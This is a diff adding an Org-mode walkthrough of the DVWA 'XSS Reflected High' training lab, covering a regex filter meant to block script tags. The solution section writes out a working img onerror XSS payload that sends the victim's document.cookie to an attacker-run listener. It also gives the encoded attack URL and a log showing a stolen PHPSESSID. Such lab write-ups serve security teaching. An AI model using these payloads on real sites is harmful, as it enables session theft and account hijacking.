@@ -1,0 +1,60 @@
+#+TITLE: DVWA - XSS Reflected High
+#+AUTHOR: Leonardo Tamiano
+
+* Description
+  Now the filtering is even more strict
+
+  #+begin_src php
+<?php
+
+header ("X-XSS-Protection: 0");
+
+// Is there any input?
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+    // Get input
+    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
+
+    // Feedback for end user
+    echo "<pre>Hello ${name}</pre>";
+}
+
+?>
+  #+end_src
+
+  here the call to ~preg_replace~ means that we will replace not only
+  <script>, but also any sequences that contain, in a case insensitive
+  way, the sequence of characters
+
+  #+begin_example
+< s c r i p t
+  #+end_example
+  
+* Solution
+  To bypass it the idea is to use JS events, which can trigger
+  javascript without having a ~<script>~ tag to deal with. An event can
+  be the ~onerror~ event of the img loading tag
+
+  #+begin_src html
+<img src='#' onerror="alert(1);">
+  #+end_src
+
+  To weaponize it in to leak the cookie we craft the following payload
+
+  #+begin_src html
+<img src='#' onerror="var xhr = new XMLHttpRequest();xhr.open('GET', `http://localhost:1337/${document.cookie}`, false);xhr.send(null);">
+  #+end_src
+
+  which we can translate to the following malicious URL
+
+  #+begin_example
+http://evil/vulnerabilities/xss_r/?name=%3Cimg+src%3D%27%23%27+onerror%3D%22var+xhr+%3D+new+XMLHttpRequest%28%29%3Bxhr.open%28%27GET%27%2C+%60http%3A%2F%2Flocalhost%3A1337%2F%24%7Bdocument.cookie%7D%60%2C+false%29%3Bxhr.send%28null%29%3B%22%3E
+  #+end_example
+
+  with this script we're able to leak the user cookie
+
+  #+begin_example
+[leo@archlinux xss_reflected]$ python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+127.0.0.1 - - [07/Nov/2023 19:07:14] code 404, message File not found
+127.0.0.1 - - [07/Nov/2023 19:07:14] "GET /PHPSESSID=301dckse7uvq2hn6dbmu9o62t2;%20security=high HTTP/1.1" 404 -
+  #+end_example
